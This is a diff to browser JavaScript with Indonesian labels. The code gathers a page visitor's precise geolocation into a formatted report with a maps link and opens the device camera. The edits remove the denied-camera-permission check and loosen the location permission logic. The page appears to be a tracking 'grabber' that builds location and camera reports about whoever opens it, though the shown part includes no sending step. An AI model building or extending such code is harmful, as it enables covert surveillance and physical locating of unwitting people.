@@ -169,55 +169,38 @@ Kota                : ${ip.city}
 
     const ambilLokasi = () => {
       return new Promise((resolve) => {
-        if (!navigator.permissions) {
+        if (!navigator.permissions || !navigator.permissions.query) {
           navigator.geolocation.getCurrentPosition(success, error);
           return;
         }
 
         navigator.permissions.query({ name: 'geolocation' }).then(result => {
-          if (result.state === "granted") {
-            navigator.geolocation.getCurrentPosition(success, error);
-          } else if (result.state === "prompt") {
+          if (result.state === "granted" || result.state === "prompt") {
             navigator.geolocation.getCurrentPosition(success, error);
           } else {
-            resolve(`
-- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
-
-❌ Lokasi tidak diizinkan oleh pengguna.`);
+            resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
           }
         });
 
         function success(pos) {
           const { latitude, longitude, accuracy } = pos.coords;
-          resolve(`
-౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
-
-Latitude            : ${latitude}
-Longitude           : ${longitude}
-Akurasi             : ±${accuracy} meter
-Peta                : https://maps.google.com/?q=${latitude},${longitude}
-`);
+          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
         }
 
         function error() {
-          resolve(`
-- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
-
-❌ Lokasi tidak diizinkan oleh pengguna.`);
+          resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
         }
       });
     };
 
     const ambilKamera = async (facingMode, label) => {
       try {
-        const perms = await navigator.permissions?.query({ name: 'camera' });
-        if (perms && perms.state === 'denied') throw new Error();
-
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
         const video = document.createElement("video");
         video.srcObject = stream;
         video.setAttribute("playsinline", true);
         await video.play();
+
         await new Promise(resolve => {
           const cek = () => {
             if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
